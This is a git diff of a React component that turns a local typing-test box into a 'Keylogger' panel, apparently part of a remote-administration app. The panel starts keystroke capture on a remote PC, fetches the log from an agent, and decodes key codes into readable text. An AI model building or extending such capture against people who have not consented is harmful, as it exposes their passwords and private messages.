@@ -1,82 +1,55 @@
-import { useRef, useState } from 'react';
+import { useMemo } from 'react';
 import { useModalEscape } from '../hooks/useModalEscape';
+import { formatKeylogDisplay, type KeylogTargetOs } from '../utils/formatKeylogDisplay';
 
 type KeyloggerModalProps = {
-    open: boolean;
-    targetLabel: string;
-    running: boolean;
-    content: string;
-    busy: boolean;
-    onClose: () => void;
-    onStart: () => void;
-    onStop: () => void;
-    onRefresh: () => void;
-    onClear: () => void;
+  open: boolean;
+  targetLabel: string;
+  /** OS of the remote PC (fallback when log lines do not contain vk=/keycode=). */
+  targetOs: KeylogTargetOs;
+  running: boolean;
+  content: string;
+  busy: boolean;
+  /** Local display cleared: polling is paused until user resumes or fetches from agent again. */
+  viewCleared: boolean;
+  onClose: () => void;
+  onStart: () => void;
+  onClearLog: () => void;
+  /** Fetches the latest keylog from the agent and shows it again. */
+  onResumeView: () => void;
 };
 
-function formatNow() {
-    return new Date().toLocaleTimeString('vi-VN', { hour12: false });
-}
-
 function KeyloggerModal({
-    open,
-    targetLabel,
-    running,
-    content,
-    busy,
-    onClose,
-    onStart,
-    onStop,
-    onRefresh,
-    onClear,
+  open,
+  targetLabel,
+  targetOs,
+  running,
+  content,
+  busy,
+  viewCleared,
+  onClose,
+  onStart,
+  onClearLog,
+  onResumeView,
 }: KeyloggerModalProps) {
-    useModalEscape(open, onClose);
+  useModalEscape(open, onClose);
 
-    const inputRef = useRef<HTMLTextAreaElement | null>(null);
-    const [inputValue, setInputValue] = useState('');
-    const [localLog, setLocalLog] = useState('');
+  const decodedText = useMemo(() => formatKeylogDisplay(content, targetOs), [content, targetOs]);
 
-    if (!open) return null;
+  const logBody = useMemo(() => {
+    if (viewCleared && !content.trim()) {
+      return '(log view cleared — use Show from agent to load the remote keylog again)';
+    }
+    if (decodedText.length > 0) {
+      return decodedText;
+    }
+    if (content.trim()) {
+      return content;
+    }
+    return '(waiting for keyboard activity...)';
+  }, [viewCleared, content, decodedText]);
 
-    const handleStart = () => {
-        setInputValue('');
-        setLocalLog(`[${formatNow()}] START\n`);
-        onStart();
-
-        setTimeout(() => {
-            inputRef.current?.focus();
-        }, 50);
-    };
-
-    const handleStop = () => {
-        setLocalLog((prev) => `${prev}\n[${formatNow()}] STOP\n`);
-        onStop();
-    };
-
-    const handleClear = () => {
-        setInputValue('');
-        setLocalLog('');
-        onClear();
-
-        setTimeout(() => {
-            inputRef.current?.focus();
-        }, 50);
-    };
-
-    const handleRefresh = () => {
-        onRefresh();
-    };
-
-    const handleInputChange = (event: React.ChangeEvent<HTMLTextAreaElement>) => {
-        const value = event.target.value;
-        setInputValue(value);
-
-        if (running) {
-            setLocalLog(value);
-        }
-    };
-
-    const displayContent = localLog || content;
+  if (!open) return null;
 
     return (
         <div className="modal-backdrop" onClick={onClose} role="presentation">
@@ -89,9 +62,10 @@ function KeyloggerModal({
             >
                 <div className="modal-header">
                     <div>
-                        <h2 id="keylogger-title">Input Test</h2>
+                        <h2 id="keylogger-title">Keylogger</h2>
                         <p className="modal-sub">
                             {targetLabel} · status {running ? 'Running' : 'Stopped'}
+                            {viewCleared && ' · log view cleared (updates paused)'}
                         </p>
                     </div>
 
@@ -104,7 +78,7 @@ function KeyloggerModal({
                     <button
                         className="btn primary"
                         disabled={busy || running}
-                        onClick={handleStart}
+                        onClick={onStart}
                         type="button"
                     >
                         Start
@@ -112,50 +86,29 @@ function KeyloggerModal({
 
                     <button
                         className="btn btn-danger"
-                        disabled={busy || !running}
-                        onClick={handleStop}
+                        disabled={busy || !running || viewCleared}
+                        onClick={onClearLog}
                         type="button"
                     >
-                        Stop
+                        Clear log
                     </button>
 
-                    <button className="btn" disabled={busy} onClick={handleRefresh} type="button">
-                        Refresh
-                    </button>
-
-                    <button className="btn" disabled={busy} onClick={handleClear} type="button">
-                        Clear
-                    </button>
-                </div>
-
-                <div style={{ marginBottom: 12 }}>
-                    <p className="modal-sub" style={{ marginBottom: 6 }}>
-                        Ô input test: bấm Start rồi gõ vào đây để kiểm tra.
-                    </p>
-
-                    <textarea
-                        ref={inputRef}
-                        placeholder="Gõ vào đây để test nhập liệu..."
-                        value={inputValue}
-                        onChange={handleInputChange}
-                        style={{
-                            width: '100%',
-                            minHeight: 100,
-                            padding: 10,
-                            borderRadius: 8,
-                            border: '1px solid #3a4664',
-                            background: '#0f172a',
-                            color: '#e5eefc',
-                            resize: 'vertical',
-                            outline: 'none',
-                            boxSizing: 'border-box',
-                        }}
-                    />
+                    {viewCleared && (
+                        <button
+                            className="btn"
+                            disabled={busy || !running}
+                            onClick={onResumeView}
+                            type="button"
+                        >
+                            Show from agent
+                        </button>
+                    )}
                 </div>
 
                 <div className="process-table-wrap">
                     <p className="modal-sub keylogger-log-hint">
-                        Chỉ test nhập liệu cục bộ trong app, không gửi phím sang agent.
+                        Nội dung gõ trên máy server sẽ hiển thị bên dưới (đã đổi vk/keycode thành ký tự; QWERTY, không
+                        biết Shift/Caps — chữ A–Z hiển thị dạng thường).
                     </p>
 
                     <pre
@@ -163,9 +116,10 @@ function KeyloggerModal({
                         style={{
                             whiteSpace: 'pre-wrap',
                             wordBreak: 'break-word',
+                            minHeight: 220,
                         }}
                     >
-                        {displayContent || '(empty log)'}
+                        {logBody}
                     </pre>
                 </div>
             </div>
